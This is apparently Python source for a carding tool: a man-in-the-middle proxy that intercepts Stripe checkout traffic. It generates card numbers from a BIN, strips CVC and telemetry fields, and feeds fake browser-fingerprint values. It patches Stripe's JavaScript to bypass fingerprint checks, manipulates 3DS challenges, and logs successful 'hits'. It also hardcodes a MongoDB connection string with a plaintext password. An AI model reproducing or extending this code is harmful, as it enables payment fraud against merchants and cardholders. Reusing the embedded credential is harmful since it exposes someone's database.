import base64, brotli, datetime, glob, gzip, logging
import hashlib, http.client, http.server, importlib, io, json
import os, random, re, requests, select, socket, socketserver
import ssl, sys, tempfile, threading, time, traceback, urllib.parse, zlib
...
userDatabase = MongoClient(
    "mongodb+srv://fkmahin71:ReOrkl0Q4KL2rgay@nahid.reryxtc.mongodb.net"
).aditya.aditya
...
def request_handler(req, req_body):
    if req.path.split("://", 1)[1].startswith("api.stripe.com"):
        try:
            if b"payment_method_data[card][number]" in req_body:
                ...
                # 𝑫𝒆𝒍𝒆𝒕𝒆 𝑷𝒂𝒚𝒎𝒆𝒏𝒕 𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 𝑨𝒏𝒅 𝑪𝒗𝒗
                parsedbody = deletefromarray(
                    parsedbody, "payment_method_data[payment_user_agent]"
                )
                parsedbody = deletefromarray(
                    parsedbody, "payment_method_data[card][cvc]"
                )

                # 𝑫𝒆𝒍𝒆𝒕𝒆 𝑳𝒐𝒈𝒈𝒊𝒏𝒈 𝑭𝒊𝒆𝒍𝒅𝒔
                parsedbody = deletefromarray(
                    parsedbody, "payment_method_data[pasted_fields]"
                )
                parsedbody = deletefromarray(
                    parsedbody, "payment_method_data[time_on_page]"
                )

                if not checkcc(
                    req.getCurrentUser().get("settings").get("bin"),
                    parsedbody["payment_method_data[card][number]"].replace(" ", ""),
                ):
                ...
                req.addToLogs(
                    "yellow:yellow:TRYING CARD: "
                    + parsedbody["payment_method_data[card][number]"].replace(" ", "")
                    + "|"
                    + parsedbody["payment_method_data[card][exp_month]"]
                    + "|"
                    + parsedbody["payment_method_data[card][exp_year]"]
                )
                ...
                # 𝑫𝒆𝒍𝒆𝒕𝒆 𝑷𝒂𝒚𝒎𝒆𝒏𝒕 𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 𝑨𝒏𝒅 𝑪𝒗𝒗
                if not parsedbody["payment_user_agent"].endswith("checkout"):
                ...
                if not checkcc(
                    req.getCurrentUser().get("settings").get("bin"),
                    parsedbody["source_data[card][number]"].replace(" ", ""),
                ):
                    gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
                ...
                req.addToLogs(
                    ...
                    + parsedbody["source_data[card][number]"].replace(" ", "")
                    + "|"
                    + parsedbody["source_data[card][exp_month]"]
                    + "|"
                    + parsedbody["source_data[card][exp_year]"]
                )
    ...
    try:
        if req.path.split("://", 1)[1].startswith("m.stripe.com") and False:
            ...
            old_req = req_body
            payload = json.loads(
                urllib.parse.unquote_plus(base64.b64decode(req_body).decode())
            )
            ...
            if payload.get("h", False) != False:
                ...
                payload["a"] = {
                    ...
                    "d": {"v": "Win32", "t": random.randint(1, 9) / 10},  # OS Version
                    "e": {
                    ...
                    "o": {
                        "v": hashlib.md5(
                            os.urandom(128)
                        ).hexdigest(),  # Canvas encoded to md5, who says it has to be a canvas tho :troll_face:
                        "t": random.randint(1, 9) / 10,
                    },
                }
...
def response_handler(req, req_body, res, res_body):
    if req.path.split("://", 1)[1].startswith("js.stripe.com"):
        ...
        stripejsuuid = (
            b"//# sourceMappingURL=https://js.stripe.com/v3/sourcemaps/stripe-"
        )
        if (
            res_body.endswith(b".js.map")
            and stripejsuuid in res_body.split(b"\n", 1)[1]
        ):
            # 𝑭𝒊𝒏𝒈𝒆𝒓𝒑𝒓𝒊𝒏𝒕 𝑩𝒚𝒑𝒂𝒔𝒔
            res_body = res_body.replace(
                b"Mo:function(){return d},Ye:function(){return p}",
                b"Mo:function(){return false},Ye:function(){return false}",
            )
            ...
            sd = sdf.read().replace(
                b"STRIPEVERSIONHERE",
                res_body.split(b',version:"', 1)[1].split(b'"', 1)[0],
            )
            res_body = res_body + b"\r\n" + sd
            sdf.close()
    ...
    try:
        if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
            if b'"decline_code": "' in res_body:
                req.addToLogs(
                    "red:red:CARD DECLINED : "
                    + (res_body.decode("utf-8"))
                    .split('"decline_code": "')[1]
                    .split('"')[0]
                )
            elif b'"code": "' in res_body:
                req.addToLogs(
                    "red:red:CARD DECLINED : "
                    + (res_body.decode("utf-8")).split('"code": "')[1].split('"')[0]
                )
            elif b'"completed": true' in res_body:
                req.addToLogs("green:lime:HIT DETECTED")

        if req.path.split("://", 1)[1].startswith(
            "api.stripe.com/v1/payment_intents/"
        ) and not req.path.split("://", 1)[1].endswith("verify_challenge"):
            if b'"decline_code": "' in res_body:
                req.addToLogs(
                    "red:red:CARD DECLINED : "
                    + (res_body.decode("utf-8"))
        ...
        if req.path.split("://", 1)[1].startswith(
            "api.stripe.com/v1/checkout/sessions/completed_webhook_delivered/"
        ):
            if b'"decline_code": "' in res_body:
                req.addToLogs(
                    "red:red:CARD DECLINED : "
    ...
    if req.path.split("://", 1)[1].startswith("api.stripe.com") and req.path.endswith(
        ...
        try:
            ...
            if "one_click_authn_device_support[hosted]" in req_body:
                ...
                del challengeData[
                    "one_click_authn_device_support[publickey_credentials_get_allowed]"
                ]
                ...
                challengeData += "&final_cres=" + urllib.parse.quote_plus(
                    stringedpayload
                )

                res_body = requests.post(
                    "https://api.stripe.com/v1/3ds2/challenge_complete",
                    proxies=req.getFormattedProxy(),
...
def gencc(U):
    ...
    while True:
        ...
        if C(A) == 0 and D(A, random.randint(0, 9)):
            return (
                A,
                str(random.choice(list(range(1, 13)))).zfill(2),
                str(
                    random.choice(
                        list(
                            range(
                ...
                str(random.randrange(1000)).zfill(3),
            )
...
class ProxyRequestHandler(BaseHTTPRequestHandler):
    ...
    def do_CONNECT(self):
        ...
        if not self.isAuthorized() and self.hostname != "nahid":
        ...
        try:
            ...
            if not self.isAuthorized():
                ...
                def create_proxy_connection(scheme, netloc):
                    full_proxy = (
                        self.getCurrentUser().get("settings").get("proxy").split(":")
                    )
                    ...
                    if scheme == "https":
                        ...
                        conn.sock = context.wrap_socket(
                            raw_socket, server_hostname=netloc
                        )
                    else:
                        conn = http.client.HTTPConnection(proxy_host, proxy_port)
                        conn.set_tunnel(
                            netloc, headers={"Proxy-Authorization": auth_header}
                        )
                ...
                if response_handler is not None:
                    ...
                    res_body_plain = self.decode_content_body(
                        res_body, content_encoding
                    )
                    res_body_modified = response_handler(
                    ...
                    if res_body_modified is not None:
                        res_body = self.encode_content_body(
                            res_body_modified, content_encoding
                        )
                        ...
                        def remove_key_case_insensitive(d, key_to_remove):
                            ...
                            keys_to_delete = [
                                k for k in d if k.lower() == key_to_remove_lower
                            ]
    ...
    def connect_intercept(self):
        ...
        with self.lock:
            key_file_name, cert_file_name = self.create_and_sign_cert(
                hostname, "ca-cert.pem", "ca-key.pem"
            )
    ...
    def handle_custom_domain(self):
        if not self.ishttps:
            ...
            if self.path == "/settings" and self.isAuthorized():
                ...
                try:
                    authorized = authorized.replace(
                        b"PROXYVAL",
                        self.getCurrentUser().get("settings").get("proxy").encode(),
                    )
                except:
                ...
                try:
                    authorized = authorized.replace(
                        b"BINVAL",
                        self.getCurrentUser().get("settings").get("bin").encode(),
                    )
                except:
            ...
            if self.path == "/login" and self.command == "POST":
                ...
                try:
                    ...
                    if not (
                        self.getUserByName(jsonData["user"]).get("password")
                        == hashedpass
                        and jsonData["fingerprint"]
                        in self.getUserByName(jsonData["user"]).get("fingerprint")
                    ):
                        self.send_response_only(302, "Found")
                        self.send_header(
    ...
    def addToLogs(self, text):
        ...
        for user in userDatabase.find():
            if user.get("ip") == client_ip:
                ...
                userDatabase.update_one(
                    {"username": user.get("username")}, {"$set": {"settings": settings}}
                )
    ...
    def getFormattedProxy(self):
        try:
            ...
            return {
                "http": "http://" + user + ":" + passwd + "@" + ip + ":" + port,
                "https": "http://" + user + ":" + passwd + "@" + ip + ":" + port,
            }
        except:
    ...
    def create_and_sign_cert(self, domain, ca_cert_file, ca_key_file, days=365):
        if isWin():
            if os.path.isfile("certs\\" + str(domain) + ".key") and os.path.isfile(
                "certs\\" + str(domain) + ".crt"
            ):
